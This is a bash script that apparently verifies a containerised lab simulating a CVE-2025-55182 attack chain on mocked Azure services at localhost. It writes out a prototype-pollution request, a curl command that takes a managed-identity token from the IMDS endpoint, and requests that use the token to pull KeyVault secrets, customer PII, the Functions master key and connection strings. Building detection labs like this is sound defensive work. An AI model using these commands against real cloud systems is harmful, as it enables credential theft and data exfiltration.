#!/bin/bash
# run_scenario.sh - Start and verify react2shell attack chain
#
# Usage:
#   ./run_scenario.sh           Start containers, run health checks and verification
#   ./run_scenario.sh -d        Run everything, then stop containers
#   ./run_scenario.sh -v        Verbose output (show full responses)

set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BUNDLE_DIR="$SCRIPT_DIR"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Defaults
STOP_SERVICES=false
VERBOSE=false

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -d|--down)
            STOP_SERVICES=true
            shift
            ;;
        -v|--verbose)
            VERBOSE=true
            shift
            ;;
        -h|--help)
            echo "Usage: $0 [options]"
            echo ""
            echo "Options:"
            echo "  -d, --down     Stop containers after verification"
            echo "  -v, --verbose  Show full API responses"
            echo "  -h, --help     Show this help message"
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

# Track results
PASSED=0
FAILED=0

pass() {
    echo -e "  ${GREEN}✓${NC} $1"
    PASSED=$((PASSED + 1))
}

fail() {
    echo -e "  ${RED}✗${NC} $1"
    FAILED=$((FAILED + 1))
}

warn() {
    echo -e "  ${YELLOW}!${NC} $1"
}

info() {
    echo -e "  ${BLUE}→${NC} $1"
}

# Store token for use across steps
TOKEN=""
SAS_TOKEN=""

echo "============================================================"
echo "SABER-SIM: react2shell (CVE-2025-55182)"
echo "============================================================"
echo ""

# =============================================================================
# STEP 1: Start Docker Compose
# =============================================================================
echo -e "${BLUE}[1/4] Starting Docker Compose${NC}"
cd "$BUNDLE_DIR"

if docker compose up -d --build 2>/dev/null; then
    pass "docker compose up -d --build"
else
    fail "docker compose up -d --build"
    exit 1
fi
echo ""

# =============================================================================
# STEP 2: Wait for Init Containers
# =============================================================================
echo -e "${BLUE}[2/4] Waiting for init containers${NC}"

TIMEOUT=120
ELAPSED=0
INTERVAL=5

while [[ $ELAPSED -lt $TIMEOUT ]]; do
    STATUS=$(docker compose ps -a init-seed 2>/dev/null | grep -iE "Exit(ed)? \(?0\)?" || true)
    if [[ -n "$STATUS" ]]; then
        pass "init-seed completed"
        break
    fi

    FAILED_STATUS=$(docker compose ps -a init-seed 2>/dev/null | grep -iE "Exit(ed)? \(?[1-9]" || true)
    if [[ -n "$FAILED_STATUS" ]]; then
        fail "init-seed failed"
        docker compose logs init-seed | tail -10
        exit 1
    fi

    sleep $INTERVAL
    ELAPSED=$((ELAPSED + INTERVAL))
    info "Waiting for seeding... ($ELAPSED/${TIMEOUT}s)"
done

if [[ $ELAPSED -ge $TIMEOUT ]]; then
    fail "init-seed timeout"
    exit 1
fi

# Verify seeding results
SEED_OUTPUT=$(docker compose logs init-seed 2>/dev/null)
if echo "$SEED_OUTPUT" | grep -q "\[OK\] Secret: storage-sas-token"; then
    pass "KeyVault secret seeded"
else
    fail "KeyVault secret not seeded"
fi

if echo "$SEED_OUTPUT" | grep -q "\[OK\] Container: sensitive-data"; then
    pass "Blob container seeded"
else
    fail "Blob container not seeded"
fi

if echo "$SEED_OUTPUT" | grep -q "\[OK\] IMDS: 1 token"; then
    pass "IMDS token seeded"
else
    fail "IMDS token not seeded"
fi
echo ""

# =============================================================================
# STEP 3: Health Checks
# =============================================================================
echo -e "${BLUE}[3/4] Health Checks${NC}"

# Wait for services to be fully ready
info "Waiting 5s for services to stabilize..."
sleep 5

check_health() {
    local name=$1
    local url=$2
    local response
    local retries=3

    for i in $(seq 1 $retries); do
        response=$(curl -sk --max-time 5 "$url" 2>/dev/null || echo "")
        if echo "$response" | grep -qi "healthy\|status"; then
            pass "$name"
            [[ "$VERBOSE" == "true" ]] && echo "      $response"
            return 0
        fi
        [[ $i -lt $retries ]] && sleep 2
    done
    fail "$name"
    return 1
}

check_health "App Service (8085)" "http://localhost:8085/health"
check_health "Azure AD (8081)" "http://localhost:8081/health"
check_health "KeyVault (8200)" "https://localhost:8200/health"
check_health "IMDS (8080)" "http://localhost:8080/health"
check_health "ARM API (8445)" "https://localhost:8445/health"
check_health "Functions (7071)" "http://localhost:7071/health"
check_health "Sentinel (5000)" "http://localhost:5000/health"
echo ""

# =============================================================================
# STEP 4: Attack Chain Verification
# =============================================================================
echo -e "${BLUE}[4/4] Attack Chain Verification${NC}"

# --- Step 4.1: Reconnaissance & Discovery ---
echo ""
echo "  Step 4.1: Reconnaissance & Discovery"

# 4.1.1: Fingerprint the application
RESPONSE=$(curl -s http://localhost:8085/ -D - 2>/dev/null || echo "")
if echo "$RESPONSE" | grep -qi "X-Powered-By: Next.js"; then
    pass "Fingerprint: Next.js detected via headers"
    [[ "$VERBOSE" == "true" ]] && echo "$RESPONSE" | grep -i "x-powered-by\|server:" | head -2
else
    fail "Fingerprint failed"
fi

# 4.1.2: Check robots.txt for hidden paths
RESPONSE=$(curl -s http://localhost:8085/robots.txt 2>/dev/null || echo "")
if echo "$RESPONSE" | grep -q "/_next/rsc"; then
    pass "robots.txt reveals /_next/rsc path"
    [[ "$VERBOSE" == "true" ]] && echo "$RESPONSE"
else
    fail "robots.txt check failed"
fi

# 4.1.3: Enumerate sitemap.xml
RESPONSE=$(curl -s http://localhost:8085/sitemap.xml 2>/dev/null || echo "")
if echo "$RESPONSE" | grep -q "/_next/rsc"; then
    pass "sitemap.xml confirms /_next/rsc endpoint"
    [[ "$VERBOSE" == "true" ]] && echo "$RESPONSE"
else
    fail "sitemap.xml check failed"
fi

# 4.1.4: Organization recon via security.txt
RESPONSE=$(curl -s http://localhost:8085/.well-known/security.txt 2>/dev/null || echo "")
if echo "$RESPONSE" | grep -qi "contoso"; then
    pass "security.txt reveals org: Contoso Corp"
    [[ "$VERBOSE" == "true" ]] && echo "$RESPONSE"
else
    fail "security.txt check failed"
fi

# 4.1.5: Get version/build info
RESPONSE=$(curl -s http://localhost:8085/api/status 2>/dev/null || echo "")
if echo "$RESPONSE" | grep -q '"version"'; then
    pass "api/status reveals version info"
    [[ "$VERBOSE" == "true" ]] && echo "$RESPONSE"
else
    fail "api/status check failed"
fi

# --- Step 4.2: Initial Access (CVE-2025-55182 RCE) ---
echo ""
echo "  Step 4.2: Initial Access (CVE-2025-55182 RCE)"
RESPONSE=$(curl -s -X POST http://localhost:8085/_next/rsc \
    -H "Content-Type: application/json" \
    -d '{"__proto__": {"polluted": true}}' 2>/dev/null || echo "")

if echo "$RESPONSE" | grep -q '"exploited":true'; then
    pass "RCE achieved - env vars leaked"
    [[ "$VERBOSE" == "true" ]] && echo "$RESPONSE" | head -c 200
else
    fail "RCE failed"
    echo "      Response: $RESPONSE"
fi

# --- Step 4.3: Credential Access (IMDS Token Theft) ---
echo ""
echo "  Step 4.3: Credential Access (IMDS Token Theft)"
RESPONSE=$(curl -s -X POST http://localhost:8085/exec \
    -H "Content-Type: application/json" \
    -d '{"cmd": "curl -s -H \"Metadata: true\" \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\""}' 2>/dev/null || echo "")

if echo "$RESPONSE" | grep -q '"access_token"'; then
    TOKEN=$(echo "$RESPONSE" | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
    pass "Managed identity token stolen"
    [[ "$VERBOSE" == "true" ]] && echo "      Token: ${TOKEN:0:50}..."
else
    fail "Token theft failed"
    echo "      Response: $RESPONSE"
fi

# --- Step 4.4: KeyVault Secret Retrieval ---
echo ""
echo "  Step 4.4: KeyVault Secret Retrieval"
if [[ -n "$TOKEN" ]]; then
    RESPONSE=$(curl -sk "https://localhost:8200/secrets/storage-sas-token" \
        -H "Authorization: Bearer $TOKEN" 2>/dev/null || echo "")

    if echo "$RESPONSE" | grep -q '"value"'; then
        SAS_TOKEN=$(echo "$RESPONSE" | grep -o '"value":"[^"]*"' | cut -d'"' -f4)
        pass "SAS token retrieved from KeyVault"
        [[ "$VERBOSE" == "true" ]] && echo "      SAS: ${SAS_TOKEN:0:50}..."
    else
        fail "KeyVault access failed"
        echo "      Response: $RESPONSE"
    fi
else
    fail "Skipped - no token from previous step"
fi

# --- Step 4.5: Blob Storage Exfiltration ---
echo ""
echo "  Step 4.5: Blob Storage Exfiltration"
if [[ -n "$SAS_TOKEN" ]]; then
    RESPONSE=$(curl -s "http://localhost:10000/proddata001/sensitive-data/customer-data.json?${SAS_TOKEN}" 2>/dev/null || echo "")

    if echo "$RESPONSE" | grep -q '"ssn"\|"email"'; then
        pass "PII data exfiltrated"
        [[ "$VERBOSE" == "true" ]] && echo "      Data: $RESPONSE"
    else
        fail "Blob access failed"
        echo "      Response: $RESPONSE"
    fi
else
    fail "Skipped - no SAS token from previous step"
fi

# --- Step 4.6: ARM API Enumeration ---
echo ""
echo "  Step 4.6: ARM API Enumeration"
if [[ -n "$TOKEN" ]]; then
    # Subscriptions
    RESPONSE=$(curl -sk "https://localhost:8445/subscriptions" \
        -H "Authorization: Bearer $TOKEN" 2>/dev/null || echo "")
    if echo "$RESPONSE" | grep -q '"subscriptionId"'; then
        pass "ARM: Subscriptions enumerated"
    else
        fail "ARM: Subscriptions failed"
    fi

    # Resource Groups
    RESPONSE=$(curl -sk "https://localhost:8445/subscriptions/12345678-1234-1234-1234-123456789abc/resourcegroups?api-version=2021-04-01" \
        -H "Authorization: Bearer $TOKEN" 2>/dev/null || echo "")
    if echo "$RESPONSE" | grep -q '"name"'; then
        pass "ARM: Resource groups enumerated"
    else
        fail "ARM: Resource groups failed"
    fi

    # Storage Accounts
    RESPONSE=$(curl -sk "https://localhost:8445/subscriptions/12345678-1234-1234-1234-123456789abc/providers/Microsoft.Storage/storageAccounts?api-version=2021-04-01" \
        -H "Authorization: Bearer $TOKEN" 2>/dev/null || echo "")
    if echo "$RESPONSE" | grep -q 'proddata001'; then
        pass "ARM: Storage accounts enumerated"
    else
        fail "ARM: Storage accounts failed"
    fi
else
    fail "Skipped - no token"
fi

# --- Step 4.7: Functions Credential Extraction ---
echo ""
echo "  Step 4.7: Functions Credential Extraction"
if [[ -n "$TOKEN" ]]; then
    # List functions
    RESPONSE=$(curl -s "http://localhost:7071/admin/functions" \
        -H "Authorization: Bearer $TOKEN" 2>/dev/null || echo "")
    if echo "$RESPONSE" | grep -q '"name"'; then
        pass "Functions: Function list retrieved"
    else
        fail "Functions: List failed"
    fi

    # Get master key
    RESPONSE=$(curl -s "http://localhost:7071/admin/host/keys" \
        -H "Authorization: Bearer $TOKEN" 2>/dev/null || echo "")
    if echo "$RESPONSE" | grep -q '"masterKey"'; then
        pass "Functions: Master key retrieved"
    else
        fail "Functions: Master key failed"
    fi

    # Get local.settings.json
    RESPONSE=$(curl -s "http://localhost:7071/api/vfs/local.settings.json" \
        -H "Authorization: Bearer $TOKEN" 2>/dev/null || echo "")
    if echo "$RESPONSE" | grep -q 'AzureWebJobsStorage'; then
        pass "Functions: Connection strings leaked"
    else
        fail "Functions: local.settings.json failed"
    fi
else
    fail "Skipped - no token"
fi

# --- Step 4.8: Azure Sentinel SIEM ---
echo ""
echo "  Step 4.8: Azure Sentinel SIEM"

# Health
RESPONSE=$(curl -s "http://localhost:5000/health" 2>/dev/null || echo "")
if echo "$RESPONSE" | grep -q '"logCount"'; then
    LOG_COUNT=$(echo "$RESPONSE" | grep -o '"logCount":[0-9]*' | cut -d':' -f2)
    pass "Sentinel: Collecting logs ($LOG_COUNT total)"
else
    fail "Sentinel: Health check failed"
fi

# Analytics rules
RESPONSE=$(curl -s "http://localhost:5000/analytics/rules" 2>/dev/null || echo "")
if echo "$RESPONSE" | grep -q '"count"'; then
    RULE_COUNT=$(echo "$RESPONSE" | grep -o '"count":[0-9]*' | cut -d':' -f2)
    pass "Sentinel: $RULE_COUNT analytics rules configured"
else
    fail "Sentinel: Analytics rules failed"
fi

# KQL query
RESPONSE=$(curl -s -X POST "http://localhost:5000/query" \
    -H "Content-Type: application/json" \
    -d '{"query": "AllLogs | take 1"}' 2>/dev/null || echo "")
if echo "$RESPONSE" | grep -q '"status":"Success"'; then
    pass "Sentinel: KQL queries working"
else
    fail "Sentinel: KQL query failed"
fi

echo ""

# =============================================================================
# Cleanup (if requested)
# =============================================================================
if [[ "$STOP_SERVICES" == "true" ]]; then
    echo -e "${BLUE}Stopping containers...${NC}"
    cd "$BUNDLE_DIR"
    docker compose down
    pass "Containers stopped"
    echo ""
fi

# =============================================================================
# Summary
# =============================================================================
echo "============================================================"
TOTAL=$((PASSED + FAILED))
if [[ $FAILED -eq 0 ]]; then
    echo -e "${GREEN}All $PASSED checks passed!${NC}"
    echo "============================================================"
    echo ""
    echo "Attack chain verified:"
    echo "  1. Initial Access    → RCE via CVE-2025-55182"
    echo "  2. Credential Access → IMDS token theft"
    echo "  3. Privilege Esc     → KeyVault SAS token"
    echo "  4. Exfiltration      → Blob storage PII"
    echo "  5. Lateral Movement  → ARM + Functions"
    echo "  6. Detection         → Sentinel SIEM"
    echo ""
    exit 0
else
    echo -e "${RED}$FAILED of $TOTAL checks failed${NC}"
    echo "============================================================"
    exit 1
fi
